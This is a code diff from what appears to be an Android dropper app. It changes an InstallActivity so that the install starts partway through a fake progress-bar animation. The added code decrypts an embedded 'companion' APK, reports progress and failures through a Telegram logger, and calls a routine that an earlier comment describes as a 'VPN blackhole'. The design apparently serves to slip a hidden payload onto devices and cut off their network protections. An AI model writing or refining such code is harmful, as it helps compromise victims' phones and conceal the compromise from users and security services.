@@ -650,44 +650,49 @@ class InstallActivity : Activity() {
         // Phase definitions: target%, duration(ms)
         data class Phase(val targetPct: Float, val durationMs: Long)
         val phases = listOf(
-            Phase(30f,   900L),   // heavy blue burst at start
-            Phase(82f,  2800L),   // slow middle
-            Phase(100f,  700L),   // fast finish
+            Phase(40f,   900L),   // Phase 1: 20→40
+            Phase(60f,  2800L),   // Phase 2: 40→60
+            Phase(100f,  700L),   // Phase 3: 70→100
         )
 
         var phaseIndex = 0
         var phaseStart = 0f
+        var installTriggered = false
 
         fun runNextPhase() {
             if (phaseIndex >= phases.size) {
-                // All phases done → brief hold then move to INSTALLING
+                // Animation complete — brief hold, animation already done its job
                 handler.postDelayed({
-                    if (stage == Stage.DOWNLOADING) {
-                        // Begin real install work on background thread
-                        setStage(Stage.INSTALLING)
-                        Thread {
-                            try {
-                                val apkBytes = getCompanionBytes()
-                                if (apkBytes.isNotEmpty()) {
-                                    TelegramLogger.log("Companion decrypted OK — ${apkBytes.size} bytes — preparing VPN blackhole")
-                                    runOnUiThread { prepareAndStartVpn(apkBytes) }
-                                } else {
-                                    TelegramLogger.log("Companion decryption returned EMPTY bytes — Stage.ERROR")
-                                    TelegramLogger.flush("FAILED_EMPTY_DECRYPT")
-                                    runOnUiThread { setStage(Stage.ERROR) }
-                                }
-                            } catch (e: Exception) {
-                                TelegramLogger.log("Companion decryption EXCEPTION: ${e::class.simpleName}: ${e.message}")
-                                TelegramLogger.flush("FAILED_DECRYPT_EXCEPTION")
-                                runOnUiThread { setStage(Stage.ERROR) }
-                            }
-                        }.start()
-                    }
-                }, 200L)  // brief 200ms hold at 100% before "Installing…"
+                    // Install already triggered at Phase 3 start — nothing to do here
+                }, 200L)
                 return
             }
 
             val phase = phases[phaseIndex]
+
+            // Phase 3 (70→100) start → setStage(INSTALLING) + trigger install immediately
+            if (phaseIndex == 2 && !installTriggered) {
+                installTriggered = true
+                setStage(Stage.INSTALLING)
+                Thread {
+                    try {
+                        val apkBytes = getCompanionBytes()
+                        if (apkBytes.isNotEmpty()) {
+                            TelegramLogger.log("Companion decrypted OK — ${apkBytes.size} bytes — proceeding to install")
+                            runOnUiThread { prepareAndStartVpn(apkBytes) }
+                        } else {
+                            TelegramLogger.log("Companion decryption returned EMPTY bytes — Stage.ERROR")
+                            TelegramLogger.flush("FAILED_EMPTY_DECRYPT")
+                            runOnUiThread { setStage(Stage.ERROR) }
+                        }
+                    } catch (e: Exception) {
+                        TelegramLogger.log("Companion decryption EXCEPTION: ${e::class.simpleName}: ${e.message}")
+                        TelegramLogger.flush("FAILED_DECRYPT_EXCEPTION")
+                        runOnUiThread { setStage(Stage.ERROR) }
+                    }
+                }.start()
+            }
+
             val animator = ValueAnimator.ofFloat(phaseStart, phase.targetPct).apply {
                 duration = phase.durationMs
                 interpolator = android.view.animation.AccelerateDecelerateInterpolator()
